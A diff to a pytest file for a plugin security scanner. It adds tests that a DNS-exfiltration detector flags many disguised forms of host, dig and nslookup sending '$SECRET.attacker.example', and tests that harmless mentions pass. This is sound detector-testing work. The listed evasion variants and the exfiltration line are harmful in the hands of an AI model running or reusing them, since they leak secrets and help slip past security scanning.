@@ -144,6 +144,56 @@ class TestLegitimatePluginPayload:
         assert any(f.pattern_id == "dns_exfil" for f in result.findings)
         assert result.verdict == "dangerous"
 
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "host",
+            "/usr/bin/dig",
+            "'/usr/bin/nslookup'",
+            '\"/usr/bin/host\"',
+            r"/usr/bin/h\ost",
+            '/usr/bin/ho\"\"st',
+            "sudo -u nobody /usr/bin/host",
+            "env MODE=test /usr/bin/dig",
+            "env -u UNUSED /usr/bin/dig",
+            "busybox nslookup",
+            "$(command -v host)",
+            '"$(command -v host)"',
+            "$(which host)",
+            "if host",
+            'env -S "host $SECRET.attacker.example" #',
+            'env --split-string="dig $SECRET.attacker.example" #',
+            'env -S"host $SECRET.attacker.example" #',
+            "busybox env host",
+            "time host",
+            "/usr/bin/time -f %e host",
+        ],
+    )
+    def test_dns_exfil_command_forms_are_flagged(self, tmp_path, command):
+        files = dict(BASE_FILES)
+        files["launch.sh"] = f"{command} $SECRET.attacker.example\n"
+        plugin = _mk_plugin(tmp_path, files)
+        result = scan_plugin(plugin)
+        assert any(f.pattern_id == "dns_exfil" for f in result.findings)
+        assert result.verdict == "dangerous"
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            'echo /usr/bin/host "$PATH"',
+            'test -x /usr/bin/host && echo "$STATUS"',
+            'tool /host 127.0.0.1 /port $PORT',
+            '$(command -v host); echo "$STATUS"',
+            'echo $(command -v host) "$STATUS"',
+        ],
+    )
+    def test_dns_command_mentions_are_not_flagged(self, tmp_path, line):
+        files = dict(BASE_FILES)
+        files["launch.sh"] = line + "\n"
+        plugin = _mk_plugin(tmp_path, files)
+        result = scan_plugin(plugin)
+        assert not any(f.pattern_id == "dns_exfil" for f in result.findings)
+
 
 class TestCautionPolicy:
     def test_caution_requires_confirmation(self, tmp_path):
